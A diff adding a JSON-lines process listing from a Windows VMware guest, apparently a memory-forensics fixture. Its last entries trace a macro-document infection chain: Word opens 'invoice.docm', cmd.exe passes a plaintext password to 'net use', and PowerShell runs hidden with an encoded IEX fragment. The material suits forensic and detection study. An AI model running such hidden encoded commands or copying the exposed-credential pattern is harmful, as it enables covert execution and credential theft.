@@ -1,0 +1,39 @@
+{"PID": 4, "Process": "System", "Args": null, "_unreadable": ["Args"]}
+{"PID": 92, "Process": "Registry", "Args": null, "_unreadable": ["Args"]}
+{"PID": 356, "Process": "smss.exe", "Args": "\\SystemRoot\\System32\\smss.exe"}
+{"PID": 468, "Process": "csrss.exe", "Args": "C:\\Windows\\system32\\csrss.exe"}
+{"PID": 544, "Process": "wininit.exe", "Args": "C:\\Windows\\system32\\wininit.exe"}
+{"PID": 552, "Process": "csrss.exe", "Args": "C:\\Windows\\system32\\csrss.exe"}
+{"PID": 640, "Process": "winlogon.exe", "Args": "C:\\Windows\\system32\\winlogon.exe"}
+{"PID": 676, "Process": "services.exe", "Args": "C:\\Windows\\system32\\services.exe"}
+{"PID": 696, "Process": "lsass.exe", "Args": "C:\\Windows\\system32\\lsass.exe"}
+{"PID": 804, "Process": "svchost.exe", "Args": "C:\\Windows\\system32\\svchost.exe"}
+{"PID": 828, "Process": "fontdrvhost.exe", "Args": "C:\\Windows\\system32\\fontdrvhost.exe"}
+{"PID": 900, "Process": "svchost.exe", "Args": "C:\\Windows\\system32\\svchost.exe"}
+{"PID": 980, "Process": "dwm.exe", "Args": "C:\\Windows\\system32\\dwm.exe"}
+{"PID": 1040, "Process": "svchost.exe", "Args": "C:\\Windows\\System32\\svchost.exe"}
+{"PID": 1104, "Process": "svchost.exe", "Args": "C:\\Windows\\System32\\svchost.exe"}
+{"PID": 1220, "Process": "svchost.exe", "Args": "C:\\Windows\\system32\\svchost.exe"}
+{"PID": 1388, "Process": "spoolsv.exe", "Args": "C:\\Windows\\System32\\spoolsv.exe"}
+{"PID": 1460, "Process": "svchost.exe", "Args": "C:\\Windows\\system32\\svchost.exe"}
+{"PID": 1652, "Process": "MsMpEng.exe", "Args": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe"}
+{"PID": 1700, "Process": "svchost.exe", "Args": "C:\\Windows\\system32\\svchost.exe"}
+{"PID": 1812, "Process": "VGAuthService.exe", "Args": "C:\\Program Files\\VMware\\VMware Tools\\VGAuthService.exe"}
+{"PID": 1876, "Process": "vmtoolsd.exe", "Args": "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe"}
+{"PID": 2024, "Process": "svchost.exe", "Args": "C:\\Windows\\system32\\svchost.exe"}
+{"PID": 2280, "Process": "WmiPrvSE.exe", "Args": "C:\\Windows\\system32\\wbem\\wmiprvse.exe"}
+{"PID": 2512, "Process": "SearchIndexer.exe", "Args": "C:\\Windows\\system32\\SearchIndexer.exe"}
+{"PID": 3004, "Process": "userinit.exe", "Args": "C:\\Windows\\system32\\userinit.exe"}
+{"PID": 3040, "Process": "explorer.exe", "Args": "C:\\Windows\\Explorer.EXE"}
+{"PID": 3320, "Process": "RuntimeBroker.exe", "Args": "C:\\Windows\\System32\\RuntimeBroker.exe"}
+{"PID": 3416, "Process": "SearchUI.exe", "Args": "C:\\Windows\\SystemApps\\SearchUI.exe"}
+{"PID": 3608, "Process": "SecurityHealthSystray.exe", "Args": "C:\\Windows\\System32\\SecurityHealthSystray.exe"}
+{"PID": 3672, "Process": "SecurityHealthService.exe", "Args": "C:\\Windows\\system32\\SecurityHealthService.exe"}
+{"PID": 3740, "Process": "vmtoolsd.exe", "Args": "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe"}
+{"PID": 4012, "Process": "OneDrive.exe", "Args": "C:\\Users\\alice\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe"}
+{"PID": 4388, "Process": "msedge.exe", "Args": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"}
+{"PID": 4420, "Process": "msedge.exe", "Args": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"}
+{"PID": 4876, "Process": "WINWORD.EXE", "Args": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\alice\\Documents\\invoice.docm\""}
+{"PID": 5120, "Process": "cmd.exe", "Args": "\"C:\\Windows\\system32\\cmd.exe\" /c net use \\\\fileserver\\share /user:alice S3cretPass!"}
+{"PID": 5144, "Process": "conhost.exe", "Args": "C:\\Windows\\system32\\conhost.exe"}
+{"PID": 5260, "Process": "powershell.exe", "Args": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="}
